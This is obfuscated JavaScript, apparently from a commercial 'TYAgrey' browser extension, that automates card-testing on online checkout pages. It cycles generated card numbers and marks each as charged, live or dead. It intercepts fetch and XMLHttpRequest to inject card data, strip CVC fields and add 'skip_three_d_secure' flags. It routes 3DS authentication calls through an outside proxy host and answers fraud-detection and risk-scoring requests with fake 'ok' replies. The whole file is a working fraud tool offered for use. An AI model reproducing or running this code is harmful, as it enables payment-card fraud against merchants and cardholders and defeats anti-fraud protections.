    if (!hasClickedInvoiceCardSection) {
      const _0x35ee38 = ["[class*=\"Card\"][class*=\"Section\"]", "[class*=\"PaymentMethod\"] [class*=\"Card\"]", "button:has-text(\"Card\")", "div[role=\"button\"]:has-text(\"Card\")", "[class*=\"Accordion\"] [class*=\"title\"]", "[class*=\"payment\"] [class*=\"option\"]"];
      const _0x7417d6 = document.querySelectorAll("button, [role=\"button\"], [class*=\"Section\"], [class*=\"Option\"], [class*=\"Method\"], label");
      for (const _0x506221 of _0x7417d6) {
        const _0x5069d0 = (_0x506221.textContent || "").trim();
        if (_0x5069d0 === "Card" || /^Card$/i.test(_0x5069d0) || _0x5069d0.includes("Card") && _0x5069d0.length < 20 || _0x5069d0.includes("Subscribe with Card") || _0x5069d0.includes("Pay with Card")) {
          const _0x16ae54 = _0x506221.getBoundingClientRect();
          if (_0x16ae54.width > 0 && _0x16ae54.height > 0) {
            forceClick(_0x506221);
            hasClickedInvoiceCardSection = true;
            await _0x38fef9(150);
            break;
          }
        }
      }
    }
    const _0x357344 = () => {
      const _0x106d01 = ["button[class*=\"Pay\"]", "button[type=\"submit\"]", "[class*=\"SubmitButton\"]", "[class*=\"PayButton\"]", "button[data-testid*=\"pay\"]", "button[data-testid*=\"submit\"]"];
      for (const _0x4c7729 of _0x106d01) {
        const _0x494808 = document.querySelector(_0x4c7729);
        if (_0x494808) {
          const _0x4deb7b = _0x494808.getBoundingClientRect();
          if (_0x4deb7b.width > 0 && _0x4deb7b.height > 0) {
            return _0x494808;
          }
        }
      }
      const _0x5a9a12 = document.querySelectorAll("button");
      for (const _0x430de7 of _0x5a9a12) {
        const _0x136c78 = (_0x430de7.textContent || "").trim().toLowerCase();
        if (_0x136c78 === "pay" || _0x136c78.startsWith("pay ") || _0x136c78.includes("pay $") || _0x136c78.includes("pay ₹")) {
          const _0x222aa7 = _0x430de7.getBoundingClientRect();
          if (_0x222aa7.width > 0 && _0x222aa7.height > 0) {
            return _0x430de7;
          }
        }
      }
      return null;
    };
    window.invoicePayButton = _0x357344();
    if (window.invoicePayButton) {}
    return true;
  }
  async function clickInvoicePayButton() {
    const _0x5af547 = window.invoicePayButton || (() => {
      const _0x281785 = document.querySelectorAll("button");
      for (const _0x2b6571 of _0x281785) {
        const _0x3207b3 = (_0x2b6571.textContent || "").trim().toLowerCase();
        if (_0x3207b3 === "pay" || _0x3207b3.startsWith("pay ") || _0x3207b3.includes("pay $") || _0x3207b3.includes("pay ₹")) {
          const _0x43c008 = _0x2b6571.getBoundingClientRect();
          if (_0x43c008.width > 0 && _0x43c008.height > 0) {
            return _0x2b6571;
          }
        }
      }
      return null;
    })();
    if (_0x5af547) {
      forceClick(_0x5af547);
      return true;
    }
    return false;
  }
  function startAutoSubmit() {
    if (isAutoSubmitting) {
      return;
    }
    checkDailyHitLimit().then(_0x2a6f99 => {
      if (_0x2a6f99 && _0x2a6f99.limited) {
        if (_0x2a6f99.error) {
          showWarning("⚠️ " + _0x2a6f99.error, "error");
        } else {
          const _0x3c6320 = _0x2a6f99.hits_today || 0;
          const _0x3698fa = _0x2a6f99.limit || 5;
          showWarning("⚠️ Daily hit limit reached (" + _0x3c6320 + "/" + _0x3698fa + "). Upgrade to Pro for unlimited hits.", "error");
        }
        setStartButtonEnabled(false);
        return;
      }
      proceedWithAutoSubmit();
    });
  }
  function proceedWithAutoSubmit() {
    isAutoSubmitting = true;
    hasHit = false;
    hasNotified = false;
    successStartTime = Date.now();
    resetHitStats();
    resetTyaSessionStats();
    hasClickedCardTab = false;
    hasClickedInvoiceCardSection = false;
    if (isInvoiceStripePage()) {
      handleInvoiceAutomation().then(() => {
        handleAutoSubmit();
      });
    } else {
      openCardDrawer().then(() => {
        handleAutoSubmit();
      });
    }
    const _0x53a7b4 = document.getElementById("autocoBtn");
    if (_0x53a7b4) {
      _0x53a7b4.textContent = "■ Stop";
      _0x53a7b4.classList.add("active");
    }
  }
  function stopAutoSubmit() {
    isAutoSubmitting = false;
    stopHitStats();
    const _0x430145 = document.getElementById("autocoBtn");
    if (_0x430145) {
      _0x430145.textContent = "▶ Start";
      _0x430145.classList.remove("active");
    }
    updateCurrentCardDisplay(null, null, null, null);
    if (customCheckoutActive) {
      stopCustomCheckoutAutomation();
    }
  }
  const processedResponses = new Set();
  let responseCounter = 0;
  let currentCardProcessed = false;
  let lastProcessedCard = "";
  let responseReceived = false;
  let responseResolve = null;
  function waitForResponse(_0x111129 = 15000) {
    return new Promise(_0x1fe1fd => {
      responseReceived = false;
      responseResolve = _0x1fe1fd;
      setTimeout(() => {
        if (!responseReceived) {
          responseReceived = true;
          if (responseResolve) {
            responseResolve();
          }
        }
      }, _0x111129);
    });
  }
  function signalResponseReceived() {
    responseReceived = true;
    if (responseResolve) {
      responseResolve();
      responseResolve = null;
    }
  }
  function processResponseData(_0x4d8dd2, _0x20cbbc) {
    if (_0x20cbbc && processedResponses.has(_0x20cbbc)) {
      return;
    }
    if (_0x20cbbc) {
      processedResponses.add(_0x20cbbc);
      setTimeout(() => processedResponses.delete(_0x20cbbc), 10000);
    }
    const _0x2ff69b = window.generatedCardFull || "";
    if (currentCardProcessed && _0x2ff69b === lastProcessedCard) {
      return;
    }
    function _0x4dc0b4(_0x49173c, _0x2aded7 = 0) {
      if (_0x2aded7 > 10 || !_0x49173c || typeof _0x49173c !== "object") {
        return false;
      }
      if (_0x49173c.status === "succeeded") {
        return true;
      }
      if (_0x49173c.status === "active") {
        return true;
      }
      if (_0x49173c.status === "trialing") {
        return true;
      }
      if (_0x49173c.intent_status === "succeeded") {
        return true;
      }
      if (_0x49173c.paid === true) {
        return true;
      }
      if (_0x49173c.success === true) {
        return true;
      }
      if (_0x49173c.approved === true) {
        return true;
      }
      if (_0x49173c.result === "success") {
        return true;
      }
      if (_0x49173c.state === "succeeded") {
        return true;
      }
      if (_0x49173c.payment_status === "paid") {
        return true;
      }
      if (_0x49173c.payment_status === "no_payment_required") {
        return true;
      }
      if (_0x49173c.charge_status === "succeeded") {
        return true;
      }
      if (_0x49173c.payment_intent?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.paymentIntent?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.setup_intent?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.setupIntent?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.charge?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.charge?.paid === true) {
        return true;
      }
      if (_0x49173c.subscription?.status === "active") {
        return true;
      }
      if (_0x49173c.subscription?.status === "trialing") {
        return true;
      }
      if (_0x49173c.transaction?.status === "approved") {
        return true;
      }
      if (_0x49173c.transaction?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.data?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.data?.paid === true) {
        return true;
      }
      if (_0x49173c.response?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.payment?.status === "succeeded") {
        return true;
      }
      if (_0x49173c.payment?.paid === true) {
        return true;
      }
      if (Array.isArray(_0x49173c.data) && _0x49173c.data[0]?.status === "succeeded") {
        return true;
      }
      for (const _0x6b8eb0 of Object.keys(_0x49173c)) {
        if (typeof _0x49173c[_0x6b8eb0] === "object" && _0x49173c[_0x6b8eb0] !== null) {
          if (_0x4dc0b4(_0x49173c[_0x6b8eb0], _0x2aded7 + 1)) {
            return true;
          }
        }
      }
      return false;
    }
    function _0x5ac939(_0x10c7b4, _0xb309fb = 0) {
      if (_0xb309fb > 10 || !_0x10c7b4 || typeof _0x10c7b4 !== "object") {
        return null;
      }
      if (_0x10c7b4.decline_code) {
        return _0x10c7b4.decline_code;
      }
      if (_0x10c7b4.error?.decline_code) {
        return _0x10c7b4.error.decline_code;
      }
      if (_0x10c7b4.error?.code) {
        return _0x10c7b4.error.code;
      }
      if (_0x10c7b4.code && typeof _0x10c7b4.code === "string" && _0x10c7b4.code.includes("_")) {
        return _0x10c7b4.code;
      }
      if (_0x10c7b4.failure_code) {
        return _0x10c7b4.failure_code;
      }
      if (_0x10c7b4.outcome?.reason) {
        return _0x10c7b4.outcome.reason;
      }
      if (_0x10c7b4.outcome?.type === "issuer_declined") {
        return _0x10c7b4.outcome.network_status || "declined";
      }
      for (const _0x4534ae of Object.keys(_0x10c7b4)) {
        if (typeof _0x10c7b4[_0x4534ae] === "object") {
          const _0xb8b5e7 = _0x5ac939(_0x10c7b4[_0x4534ae], _0xb309fb + 1);
          if (_0xb8b5e7) {
            return _0xb8b5e7;
          }
        }
      }
      return null;
    }
    const _0x5c010f = {
      insufficient_funds: "Insufficient Funds",
      card_declined: "Card Declined",
      expired_card: "Expired Card",
      incorrect_cvc: "Incorrect CVC",
      incorrect_number: "Incorrect Number",
      invalid_cvc: "Invalid CVC",
      processing_error: "Processing Error",
      do_not_honor: "3DS Bypass",
      lost_card: "Lost Card",
      stolen_card: "Stolen Card",
      fraudulent: "Fraudulent",
      invalid_account: "Invalid Account",
      generic_decline: "Stripe Bypass",
      setup_intent_authentication_failure: "This BIN is not supported on this website."
    };
    const _0x22f8ad = _0x5ac939(_0x4d8dd2);
    if (_0x22f8ad) {} else {
      const _0x2e3219 = _0x4dc0b4(_0x4d8dd2);
      if (_0x2e3219) {
        currentCardProcessed = true;
        lastProcessedCard = _0x2ff69b;
        signalResponseReceived();
        const _0xe4359c = _0x2ff69b ? _0x2ff69b.split("|")[0] : "";
        updateTyaSessionStats("CHARGED", _0xe4359c);
        handleSuccess();
        return;
      }
    }
    extractPaymentData(_0x4d8dd2);
    if (!_0x22f8ad) {
      const _0x21dbff = _0x4d8dd2.error?.message || _0x4d8dd2.message || _0x4d8dd2.error_message || "";
      if (_0x21dbff) {
        const _0x53b1c3 = _0x21dbff.toLowerCase();
        if (_0x53b1c3.includes("insufficient funds")) {
          _0x22f8ad = "insufficient_funds";
        } else if (_0x53b1c3.includes("card declined")) {
          _0x22f8ad = "card_declined";
        } else if (_0x53b1c3.includes("expired card")) {
          _0x22f8ad = "expired_card";
        } else if (_0x53b1c3.includes("incorrect cvc")) {
          _0x22f8ad = "incorrect_cvc";
        } else if (_0x53b1c3.includes("incorrect number")) {
          _0x22f8ad = "incorrect_number";
        } else if (_0x53b1c3.includes("invalid cvc")) {
          _0x22f8ad = "invalid_cvc";
        } else if (_0x53b1c3.includes("processing error")) {
          _0x22f8ad = "processing_error";
        } else if (_0x53b1c3.includes("do not honor")) {
          _0x22f8ad = "do_not_honor";
        } else if (_0x53b1c3.includes("lost card")) {
          _0x22f8ad = "lost_card";
        } else if (_0x53b1c3.includes("stolen card")) {
          _0x22f8ad = "stolen_card";
        } else if (_0x53b1c3.includes("fraud")) {
          _0x22f8ad = "fraudulent";
        } else if (_0x53b1c3.includes("invalid account")) {
          _0x22f8ad = "invalid_account";
        } else if (_0x53b1c3.includes("generic decline")) {
          _0x22f8ad = "generic_decline";
        }
      }
    }
    if (_0x22f8ad && (_0x22f8ad.toLowerCase().includes("timeout") || _0x22f8ad === "request_timeout")) {
      return;
    }
    if (_0x22f8ad) {
      currentCardProcessed = true;
      lastProcessedCard = _0x2ff69b;
      signalResponseReceived();
      const _0x295145 = _0x5c010f[_0x22f8ad] || _0x22f8ad;
      showWarning("❌ " + _0x295145);
      const _0x3b7bd4 = _0x2ff69b ? _0x2ff69b.split("|")[0] : "";
      const _0x3d9ba0 = ["insufficient_funds", "do_not_honor", "try_again_later", "issuer_declined"];
      const _0x5cb258 = _0x3d9ba0.includes(_0x22f8ad.toLowerCase());
      updateTyaSessionStats(_0x5cb258 ? "LIVE" : "DEAD", _0x3b7bd4);
      if (window.TyagreyOverlay && window.TyagreyOverlay.handleResult) {
        window.TyagreyOverlay.handleResult(_0x5cb258 ? "CCN_LIVE" : "DEAD");
      }
      if (customCheckoutActive) {
        updateCustomCheckoutStats(_0x5cb258 ? "live" : "dead");
      }
      if (window.generatedCardFull) {
        const _0xfcd546 = window.generatedCardFull.split("|");
        addToHistory(_0xfcd546[0], _0xfcd546[1], _0xfcd546[2], _0xfcd546[3], _0x22f8ad);
      }
      const _0x51805c = ["checkout_not_active_session", "checkout_session_expired", "payment_intent_unexpected_state", "resource_missing", "session_expired", "expired_session", "invalid_session"];
      const _0xa9aead = _0x22f8ad.toLowerCase();
      const _0x57f729 = _0xa9aead.includes("session") || _0xa9aead.includes("expired") && _0xa9aead !== "expired_card";
      if (_0x51805c.includes(_0xa9aead) || _0x57f729) {
        autoStopOnError(_0x295145);
      }
    }
  }
  function autoStopOnError(_0x57746f) {
    if (isAutoSubmitting) {
      isAutoSubmitting = false;
      const _0x30b0cf = document.getElementById("autocoBtn");
      if (_0x30b0cf) {
        _0x30b0cf.textContent = "▶ Start";
        _0x30b0cf.classList.remove("active");
      }
      showWarning("⛔ Auto-stopped: " + _0x57746f, "error");
    }
  }
  const originalXHR = window.XMLHttpRequest;
  window.XMLHttpRequest = () => {
    const _0x3fa861 = new originalXHR();
    const _0x3d8818 = _0x3fa861.open;
    const _0xcd58ac = _0x3fa861.send;
    const _0x575d10 = ++responseCounter;
    _0x3fa861.addEventListener("load", function () {
      try {
        if (this.responseText) {
          const _0x5092ee = JSON.parse(this.responseText);
          processResponseData(_0x5092ee, "xhr_" + _0x575d10);
        }
      } catch (_0x12c117) {}
    });
    _0x3fa861.addEventListener("error", () => {});
    _0x3fa861.addEventListener("timeout", () => {});
    _0x3fa861.open = function (_0x271897, _0x34f9e5) {
      if (_0x34f9e5 && typeof _0x34f9e5 === "string" && (/\/3ds2\/authenticate/i.test(_0x34f9e5) || /\/3ds\/authenticate/i.test(_0x34f9e5) || /\/verify_challenge/i.test(_0x34f9e5) || /\/v\d+\/payments\/details/i.test(_0x34f9e5) || /\/threeDS2\//i.test(_0x34f9e5) || /\/3ds/i.test(_0x34f9e5) || /\/charges\/[^/]+\/3ds/i.test(_0x34f9e5) || /\/transactions/i.test(_0x34f9e5) || /\/purchase/i.test(_0x34f9e5) || /\/securedfields/i.test(_0x34f9e5) || /\/token/i.test(_0x34f9e5) || /\/safekey/i.test(_0x34f9e5) || /\/americanexpress/i.test(_0x34f9e5) || /\/amex\/3ds/i.test(_0x34f9e5) || /\/braintree\/3ds/i.test(_0x34f9e5) || /\/square\/3ds/i.test(_0x34f9e5) || /\/paypal\/3ds/i.test(_0x34f9e5) || /\/woocommerce\/3ds/i.test(_0x34f9e5))) {
        try {
          if (!has3DSAccess()) {
            console.log("[TYAgrey] 3DS bypass blocked - requires Pro+ role");
            return _0x3d8818.call(this, _0x271897, _0x34f9e5);
          }
          let _0x27f578 = "stripe";
          if (/adyen/i.test(_0x34f9e5)) {
            _0x27f578 = "adyen";
          } else if (/checkout\.com|checkout/i.test(_0x34f9e5)) {
            _0x27f578 = "checkout";
          } else if (/recurly/i.test(_0x34f9e5)) {
            _0x27f578 = "recurly";
          } else if (/xsolla/i.test(_0x34f9e5)) {
            _0x27f578 = "xsolla";
          } else if (/safekey|americanexpress|amex/i.test(_0x34f9e5)) {
            _0x27f578 = "amex";
          } else if (/braintree/i.test(_0x34f9e5)) {
            _0x27f578 = "braintree";
          } else if (/squareup|square/i.test(_0x34f9e5)) {
            _0x27f578 = "square";
          } else if (/paypal/i.test(_0x34f9e5)) {
            _0x27f578 = "paypal";
          } else if (/woocommerce|wc-/i.test(_0x34f9e5)) {
            _0x27f578 = "woocommerce";
          }
          const _0x2f8019 = "https://tyagry.cloud/3ds-proxy.php";
          const _0x1b10e8 = _0x2f8019 + "?source=" + _0x27f578 + "&original=" + encodeURIComponent(_0x34f9e5) + "&method=" + _0x271897;
          this._tyagrey3dsProxy = true;
          this.timeout = 3000;
          console.log("[TYAgrey 3DS] Routing through proxy:", _0x1b10e8);
          return _0x3d8818.call(this, _0x271897, _0x1b10e8);
        } catch (_0xd00b6a) {}
      }
      if (_0x34f9e5 && typeof _0x34f9e5 === "string" && /3dsecure|3ds|acs|challenge|cardinal|mpi|pareq|pares|threatmetrix|three_d_secure|threeDS|safekey|americanexpress|amex\/3ds|authenticate|verification|fingerprint|telemetry|analytics|fraud|risk|binlookup|fingerprint|devicefingerprint|kount|riskified|forter|sift|iovation|threatmetrix|experian|lexisnexis|transunion|equifax|clearsale|signifyd|nethone|cybersource|radar|fraud_detection|risk_assessment|risk_scoring|risk_analysis/i.test(_0x34f9e5)) {
        this._tyagrey3dsBlocked = true;
        return _0x3d8818.call(this, "GET", "data:text/plain,{}");
      }
      if (_0x34f9e5 && typeof _0x34f9e5 === "string" && realCardValues.cardNumber) {
        if (_0x34f9e5.includes("card[number]=0000000000000000")) {
          _0x34f9e5 = _0x34f9e5.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber);
        }
        if (_0x34f9e5.includes("card[exp_month]=01") && _0x34f9e5.includes("card[exp_year]=30")) {
          const _0x1e3c78 = realCardValues.cardExpiry.split("/");
          _0x34f9e5 = _0x34f9e5.replace("card[exp_month]=01", "card[exp_month]=" + _0x1e3c78[0]);
          _0x34f9e5 = _0x34f9e5.replace("card[exp_year]=30", "card[exp_year]=" + _0x1e3c78[1]);
        }
        if (_0x34f9e5.includes("card[cvc]=000")) {
          _0x34f9e5 = _0x34f9e5.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc);
        }
        if (has3DSAccess()) {
          const _0x5dc0a1 = "414720";
          _0x34f9e5 = _0x34f9e5.replace(/card_bin=\d{6}/, "card_bin=" + _0x5dc0a1);
        }
      }
      return _0x3d8818.apply(_0x3fa861, arguments);
    };
    _0x3fa861.send = function (_0xf5e1f6) {
      if (_0xf5e1f6 && typeof _0xf5e1f6 === "string" && realCardValues.cardNumber) {
        if (_0xf5e1f6.includes("card[number]=0000000000000000")) {
          _0xf5e1f6 = _0xf5e1f6.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber);
        }
        if (_0xf5e1f6.includes("card[exp_month]=01") && _0xf5e1f6.includes("card[exp_year]=30")) {
          const _0xdb3462 = realCardValues.cardExpiry.split("/");
          _0xf5e1f6 = _0xf5e1f6.replace("card[exp_month]=01", "card[exp_month]=" + _0xdb3462[0]);
          _0xf5e1f6 = _0xf5e1f6.replace("card[exp_year]=30", "card[exp_year]=" + _0xdb3462[1]);
        }
        if (_0xf5e1f6.includes("card[cvc]=000")) {
          _0xf5e1f6 = _0xf5e1f6.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc);
        }
        if (has3DSAccess()) {
          const _0x55b57f = "414720";
          const _0x36e400 = ["cvc", "cvv", "security_code", "cvv2", "cvc2", "card[cvc]", "card[cvv]", "payment_method_data[card][cvc]", "payment_method_options[card][cvc]", "link[card][cvc]", "source_data[card][cvc]", "source[card][cvc]", "encryptedSecurityCode"];
          _0x36e400.forEach(_0x50028c => {
            const _0x2b1b13 = new RegExp(_0x50028c + "=[^&]*", "gi");
            _0xf5e1f6 = _0xf5e1f6.replace(_0x2b1b13, "");
          });
          if (_0xf5e1f6.includes("payment_method_data")) {
            _0xf5e1f6 = _0xf5e1f6.replace(/payment_method_data\[payment_method_data\]\[card\]\[three_d_secure_usage\]/gi, "payment_method_data[payment_method_data][card][three_d_secure_usage]");
            _0xf5e1f6 += "&payment_method_data[payment_method_data][card][three_d_secure_usage][supported]=true";
            _0xf5e1f6 += "&payment_method_data[payment_method_data][card][three_d_secure_usage][configuration][skip_three_d_secure]=true";
          }
          _0xf5e1f6 = _0xf5e1f6.replace(/card_bin=\d{6}/, "card_bin=" + _0x55b57f);
        }
      }
      if (_0xf5e1f6 && typeof _0xf5e1f6 === "string" && realCardValues.cardNumber && has3DSAccess()) {
        try {
          const _0x1024ee = JSON.parse(_0xf5e1f6);
          const _0x486ebf = "414720";
          let _0x37e5c3 = false;
          const _0x139345 = ["cvc", "cvv", "security_code", "cvv2", "cvc2", "encryptedSecurityCode"];
          _0x139345.forEach(_0x1637fc => {
            if (_0x1024ee[_0x1637fc]) {
              delete _0x1024ee[_0x1637fc];
              _0x37e5c3 = true;
            }
            if (_0x1024ee.card && _0x1024ee.card[_0x1637fc]) {
              delete _0x1024ee.card[_0x1637fc];
              _0x37e5c3 = true;
            }
            if (_0x1024ee.payment_method_data && _0x1024ee.payment_method_data.card && _0x1024ee.payment_method_data.card[_0x1637fc]) {
              delete _0x1024ee.payment_method_data.card[_0x1637fc];
              _0x37e5c3 = true;
            }
            if (_0x1024ee.source && _0x1024ee.source[_0x1637fc]) {
              delete _0x1024ee.source[_0x1637fc];
              _0x37e5c3 = true;
            }
          });
          if (_0x1024ee.payment_method_data && _0x1024ee.payment_method_data.card) {
            if (!_0x1024ee.payment_method_data.card.three_d_secure_usage) {
              _0x1024ee.payment_method_data.card.three_d_secure_usage = {
                supported: true
              };
              _0x37e5c3 = true;
            }
            if (!_0x1024ee.payment_method_data.card.three_d_secure_usage.configuration) {
              _0x1024ee.payment_method_data.card.three_d_secure_usage.configuration = {
                skip_three_d_secure: true
              };
              _0x37e5c3 = true;
            }
          }
          if (_0x1024ee.card_bin && typeof _0x1024ee.card_bin === "string") {
            _0x1024ee.card_bin = _0x486ebf;
            _0x37e5c3 = true;
          }
          if (_0x1024ee.card && _0x1024ee.card.card_bin && typeof _0x1024ee.card.card_bin === "string") {
            _0x1024ee.card.card_bin = _0x486ebf;
            _0x37e5c3 = true;
          }
          if (_0x1024ee.xps_open_card && typeof _0x1024ee.xps_open_card === "object") {
            _0x1024ee.xps_open_card.card_bin = _0x486ebf;
            _0x37e5c3 = true;
          }
          if (_0x37e5c3) {
            _0xf5e1f6 = JSON.stringify(_0x1024ee);
          }
        } catch (_0x45a23e) {}
      }
      return _0xcd58ac.apply(_0x3fa861, [_0xf5e1f6]);
    };
    return _0x3fa861;
  };
  const originalFetch = window.fetch;
  window.fetch = async function (_0x9537af, _0x3d85cc) {
    if (_0x3d85cc && _0x3d85cc.body && typeof _0x3d85cc.body === "string" && realCardValues.cardNumber) {
      if (_0x3d85cc.body.includes("card[number]=0000000000000000")) {
        _0x3d85cc.body = _0x3d85cc.body.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber);
      }
      if (_0x3d85cc.body.includes("card[exp_month]=01") && _0x3d85cc.body.includes("card[exp_year]=30")) {
        const _0x46bc41 = realCardValues.cardExpiry.split("/");
        _0x3d85cc.body = _0x3d85cc.body.replace("card[exp_month]=01", "card[exp_month]=" + _0x46bc41[0]);
        _0x3d85cc.body = _0x3d85cc.body.replace("card[exp_year]=30", "card[exp_year]=" + _0x46bc41[1]);
      }
      if (_0x3d85cc.body.includes("card[cvc]=000")) {
        _0x3d85cc.body = _0x3d85cc.body.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc);
      }
      if (has3DSAccess()) {
        const _0x120540 = "414720";
        const _0x1b56eb = ["cvc", "cvv", "security_code", "cvv2", "cvc2", "card[cvc]", "card[cvv]", "payment_method_data[card][cvc]", "payment_method_options[card][cvc]", "link[card][cvc]", "source_data[card][cvc]", "source[card][cvc]", "encryptedSecurityCode"];
        _0x1b56eb.forEach(_0x394d60 => {
          const _0x445086 = new RegExp(_0x394d60 + "=[^&]*", "gi");
          _0x3d85cc.body = _0x3d85cc.body.replace(_0x445086, "");
        });
        if (_0x3d85cc.body.includes("payment_method_data")) {
          _0x3d85cc.body = _0x3d85cc.body.replace(/payment_method_data\[payment_method_data\]\[card\]\[three_d_secure_usage\]/gi, "payment_method_data[payment_method_data][card][three_d_secure_usage]");
          _0x3d85cc.body += "&payment_method_data[payment_method_data][card][three_d_secure_usage][supported]=true";
          _0x3d85cc.body += "&payment_method_data[payment_method_data][card][three_d_secure_usage][configuration][skip_three_d_secure]=true";
        }
        _0x3d85cc.body = _0x3d85cc.body.replace(/card_bin=\d{6}/, "card_bin=" + _0x120540);
      }
    }
    if (_0x3d85cc && _0x3d85cc.body && typeof _0x3d85cc.body === "string" && realCardValues.cardNumber && has3DSAccess()) {
      try {
        const _0x15650b = JSON.parse(_0x3d85cc.body);
        const _0x3e66f2 = "414720";
        let _0x36ee1b = false;
        const _0x4dd360 = ["cvc", "cvv", "security_code", "cvv2", "cvc2", "encryptedSecurityCode"];
        _0x4dd360.forEach(_0x27cbb0 => {
          if (_0x15650b[_0x27cbb0]) {
            delete _0x15650b[_0x27cbb0];
            _0x36ee1b = true;
          }
          if (_0x15650b.card && _0x15650b.card[_0x27cbb0]) {
            delete _0x15650b.card[_0x27cbb0];
            _0x36ee1b = true;
          }
          if (_0x15650b.payment_method_data && _0x15650b.payment_method_data.card && _0x15650b.payment_method_data.card[_0x27cbb0]) {
            delete _0x15650b.payment_method_data.card[_0x27cbb0];
            _0x36ee1b = true;
          }
          if (_0x15650b.source && _0x15650b.source[_0x27cbb0]) {
            delete _0x15650b.source[_0x27cbb0];
            _0x36ee1b = true;
          }
        });
        if (_0x15650b.card_bin && typeof _0x15650b.card_bin === "string") {
          _0x15650b.card_bin = _0x3e66f2;
          _0x36ee1b = true;
        }
        if (_0x15650b.card && _0x15650b.card.card_bin && typeof _0x15650b.card.card_bin === "string") {
          _0x15650b.card.card_bin = _0x3e66f2;
          _0x36ee1b = true;
        }
        if (_0x15650b.xps_open_card && typeof _0x15650b.xps_open_card === "object") {
          _0x15650b.xps_open_card.card_bin = _0x3e66f2;
          _0x36ee1b = true;
        }
        if (_0x36ee1b) {
          _0x3d85cc.body = JSON.stringify(_0x15650b);
        }
      } catch (_0x2e7e82) {}
    }
    const _0x24f748 = "fetch_" + ++responseCounter;
    const _0x93eb54 = typeof _0x9537af === "string" ? _0x9537af : _0x9537af?.url || "";
    if (_0x93eb54 && (/\/3ds2\/authenticate/i.test(_0x93eb54) || /\/3ds\/authenticate/i.test(_0x93eb54) || /\/verify_challenge/i.test(_0x93eb54) || /\/v\d+\/payments\/details/i.test(_0x93eb54) || /\/threeDS2\//i.test(_0x93eb54) || /\/3ds/i.test(_0x93eb54) || /\/charges\/[^/]+\/3ds/i.test(_0x93eb54) || /\/transactions/i.test(_0x93eb54) || /\/purchase/i.test(_0x93eb54) || /\/securedfields/i.test(_0x93eb54) || /\/token/i.test(_0x93eb54) || /\/safekey/i.test(_0x93eb54) || /\/americanexpress/i.test(_0x93eb54) || /\/amex\/3ds/i.test(_0x93eb54) || /\/braintree\/3ds/i.test(_0x93eb54) || /\/square\/3ds/i.test(_0x93eb54) || /\/paypal\/3ds/i.test(_0x93eb54) || /\/woocommerce\/3ds/i.test(_0x93eb54))) {
      try {
        let _0x3b3584 = "stripe";
        if (/adyen/i.test(_0x93eb54)) {
          _0x3b3584 = "adyen";
        } else if (/checkout\.com|checkout/i.test(_0x93eb54)) {
          _0x3b3584 = "checkout";
        } else if (/recurly/i.test(_0x93eb54)) {
          _0x3b3584 = "recurly";
        } else if (/xsolla/i.test(_0x93eb54)) {
          _0x3b3584 = "xsolla";
        } else if (/safekey|americanexpress|amex/i.test(_0x93eb54)) {
          _0x3b3584 = "amex";
        } else if (/braintree/i.test(_0x93eb54)) {
          _0x3b3584 = "braintree";
        } else if (/squareup|square/i.test(_0x93eb54)) {
          _0x3b3584 = "square";
        } else if (/paypal/i.test(_0x93eb54)) {
          _0x3b3584 = "paypal";
        } else if (/woocommerce|wc-/i.test(_0x93eb54)) {
          _0x3b3584 = "woocommerce";
        }
        const _0x588a65 = "https://tyagry.cloud/3ds-proxy.php";
        const _0xdeed34 = _0x588a65 + "?source=" + _0x3b3584 + "&original=" + encodeURIComponent(_0x93eb54) + "&method=" + (_0x3d85cc?.method || "GET");
        const _0x3448c1 = typeof _0x9537af === "string" ? _0xdeed34 : {
          ...(_0x9537af || {}),
          url: _0xdeed34
        };
        console.log("[TYAgrey 3DS] Routing fetch through proxy:", _0xdeed34);
        const _0x4a7762 = originalFetch.apply(this, [_0x3448c1, _0x3d85cc]);
        const _0x2e3cc0 = new Promise((_0x4210b6, _0x46c59d) => setTimeout(() => _0x46c59d(new Error("Proxy timeout")), 3000));
        return await Promise.race([_0x4a7762, _0x2e3cc0]);
      } catch (_0x1823c4) {}
    }
    if (_0x93eb54 && /3dsecure|3ds|acs|challenge|cardinal|mpi|pareq|pares|threatmetrix|three_d_secure|threeDS|safekey|americanexpress|amex\/3ds|authenticate|verification|fingerprint|telemetry|analytics|fraud|risk|binlookup|devicefingerprint|kount|riskified|forter|sift|iovation|experian|lexisnexis|transunion|equifax|clearsale|signifyd|nethone|cybersource|radar|fraud_detection|risk_assessment|risk_scoring|risk_analysis/i.test(_0x93eb54)) {
      return new Response("{\"status\":\"ok\"}", {
        status: 200,
        headers: {
          "content-type": "application/json"
        }
      });
    }
    try {
      const _0x5b59fd = await originalFetch.apply(this, [_0x9537af, _0x3d85cc]);
      const _0x542423 = typeof _0x9537af === "string" ? _0x9537af : _0x9537af?.url || "";
      const _0x487b42 = _0x5b59fd.headers?.get("content-type") || "";
      if (_0x487b42.includes("application/json")) {
        try {
          const _0x5e8311 = _0x5b59fd.clone();
          const _0x35dd06 = await _0x5e8311.text();
          if (_0x35dd06) {
            const _0x1f2f3a = JSON.parse(_0x35dd06);
            processResponseData(_0x1f2f3a, _0x24f748);
          }
        } catch (_0xa8b51b) {}
      }
      return _0x5b59fd;
    } catch (_0x244999) {
      throw _0x244999;
    }
  };
  async function createCardGeneratorOverlay() {
    return;
    if (isCreatingOverlay) {
      return;
    }
    isCreatingOverlay = true;
    const _0xb2747f = "cardGeneratorHit_" + window.location.href;
    let _0x5d2a03 = "";
    const _0x21ecbd = new Promise(_0xe0f59d => {
      if (window.tyagreyStorage && window.tyagreyStorage.loadAllData) {
        window.tyagreyStorage.loadAllData(_0x3b2324 => {
          _0xe0f59d(_0x3b2324[_0xb2747f] === "true" || _0x3b2324[_0xb2747f] === true);
        });
      } else {
        _0xe0f59d(localStorage.getItem(_0xb2747f) === "true");
      }
    });
